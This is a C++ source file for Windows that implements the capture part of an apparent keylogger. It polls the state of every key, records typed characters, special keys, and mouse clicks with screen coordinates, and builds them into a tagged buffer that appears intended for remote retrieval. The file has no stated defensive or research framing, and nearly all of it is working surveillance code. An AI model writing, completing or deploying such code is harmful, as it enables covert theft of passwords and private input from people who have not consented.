#include "Key.h"

Key::Key() : _lastKey(-1), _upper(false) {
    _buffer = "<get><key>";
    _key[VK_BACK] = &Key::vkBack;
    _key[VK_LBUTTON] = &Key::vkLbutton;
    _key[VK_RBUTTON] = &Key::vkRbutton;
    _key[VK_TAB] = &Key::vkTab;
    _key[VK_RETURN] = &Key::vkReturn;
    _key[VK_SHIFT] = &Key::vkShift;
    _key[VK_CONTROL] = &Key::vkControl;
    _key[VK_ESCAPE] = &Key::vkEscape;
    _key[VK_UP] = &Key::vkUp;
    _key[VK_RIGHT] = &Key::vkRight;
    _key[VK_DOWN] = &Key::vkDown;
    _key[VK_LEFT] = &Key::vkLeft;
    _key[VK_INSERT] = &Key::vkInsert;
    _key[VK_DELETE] = &Key::vkDelete;
    _key[VK_CAPITAL] = &Key::vkCapital;
}

Key::~Key() {
}

void                        Key::putKeyBuff(int str) {
    if (MapVirtualKey(str, MAPVK_VK_TO_CHAR) >= 65 &&
        MapVirtualKey(str, MAPVK_VK_TO_CHAR) <= 90) {
            if (!_upper)
                _buffer += MapVirtualKey(str, MAPVK_VK_TO_CHAR) + 32;
            else
                _buffer += MapVirtualKey(str, MAPVK_VK_TO_CHAR);
        }
    else if (MapVirtualKey(str, MAPVK_VK_TO_CHAR) >= 32 &&
            MapVirtualKey(str, MAPVK_VK_TO_CHAR) <= 127 &&
            MapVirtualKey(str, MAPVK_VK_TO_CHAR) != 94)
            _buffer += MapVirtualKey(str, MAPVK_VK_TO_CHAR);
}

void                        Key::putKeyBuff(std::string action) {
    _buffer += "<" + action + ">true</" + action + ">";
}

void                        Key::putKeyBuff(std::string action, std::string x, std::string y) {
    _buffer += "<" + action + ">true, x = " + x + ", y = " + y + "</" + action + ">";
}

void                        Key::rmLastKeyBuff() {
    size_t      size;

    size = _buffer.length();
    if (size > 0)
        _buffer.resize(size - 1, '\0');
}

void                        Key::cleanBuff() {
    if (_buffer != "")
    {
        _buffer = "";
        _buffer.resize(0);
        _buffer = "<get><key>";
    }
}

std::string                 Key::getBuffer() const {
    return (_buffer);
}

void                        Key::setStat() {
    _stat = false;
}

bool                        Key::getKey() {
    int                     keyNb;
    
    keyNb = -1;
    while (++keyNb <= 256) {
        if (!(GetKeyState(_lastKey) & 0x8000))
            _lastKey = -1;
        if (GetKeyState(keyNb) & 0x8000) {
            if (keyNb != _lastKey) {
                _lastKey = keyNb;
                if (_key[keyNb] && (this->*_key[keyNb])())
                    return (true);
                else {
                    if (vkKey(keyNb))
                        return (true);
                }
            }
            return (_stat);
        }
    }
    return (_stat);
}

bool            Key::vkBack() {
    putKeyBuff("backspace");
    return (true);
}

std::string                 Key::getCursorPos(int coord) {
    POINT                   lpPoint;
    std::stringstream       out;
    
    GetCursorPos(&lpPoint);
    if (coord == X)
        out << (int)lpPoint.x;
    else
        out << (int)lpPoint.y;
    return (out.str());
}

bool                        Key::vkLbutton() {
    putKeyBuff("left_button", getCursorPos(X), getCursorPos(Y));
    return (true);
}

bool                        Key::vkRbutton() {
    putKeyBuff("right_button", getCursorPos(X), getCursorPos(Y));
    return (true);
}

bool                        Key::vkTab() {
    putKeyBuff("tab");
    return (true);
}

bool                        Key::vkReturn() {
    putKeyBuff("enter");
    return (true);
}

bool                        Key::vkShift() {
    putKeyBuff("shift");
    return (true);
}

bool                        Key::vkControl() {
    putKeyBuff("control");
    return (true);
}

bool                        Key::vkEscape() {
    putKeyBuff("escape");
    return (true);
}

bool                        Key::vkUp() {
    putKeyBuff("up");
    return (true);
}

bool                        Key::vkRight() {
    putKeyBuff("right_arrow");
    return (true);
}

bool                        Key::vkDown() {
    putKeyBuff("down_arrow");
    return (true);
}

bool                        Key::vkLeft() {
    putKeyBuff("left_arrow");
    return (true);
}

bool                        Key::vkInsert() {
    putKeyBuff("insert");
    return (true);
}

bool                        Key::vkDelete() {
    putKeyBuff("delete");
    return (true);
}

bool                        Key::vkCapital() {
    _upper = !_upper;
    if (_upper)
        std::cout << "CapsLock" << std::endl;
    return (true);
}

bool                        Key::vkKey(int keyNb) {
    putKeyBuff(keyNb);
    return (true);
}